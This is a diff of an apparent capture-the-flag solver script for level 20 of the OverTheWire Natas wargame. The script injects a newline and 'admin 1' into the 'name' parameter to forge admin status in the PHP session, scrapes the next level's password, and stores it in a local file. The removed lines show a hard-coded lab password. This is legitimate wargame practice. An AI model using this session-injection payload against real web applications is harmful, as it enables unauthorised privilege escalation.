@@ -7,21 +7,22 @@ def make():
     soup = BeautifulSoup(res.text, 'html.parser')
     return (res, soup)
 
-def writeResponse(enumerate = ''):
-    with open(f'./response{enumerate}.html', 'w') as browserFile:
-        browserFile.write(soup.prettify())
 
 
-url = 'http://natas20.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas20','guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH')
+lvl = '20'
+next_level = str(int(lvl)+1)
+pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
+url = f'http://natas{lvl}.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
+
+
 my_cookies = {"PHPSESSID":'bac'}
 my_params = {"name":"someName\nadmin 1", "password":"whatever", "debug":"true"}
-enumerate = ''
+
 res, soup = make()
 res, soup = make()
-print(re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:])
-with open(f'./response{enumerate}.html', 'w') as browserFile:
-    browserFile.write(soup.prettify())
+pw = re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]
+open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)
 
 
 '''
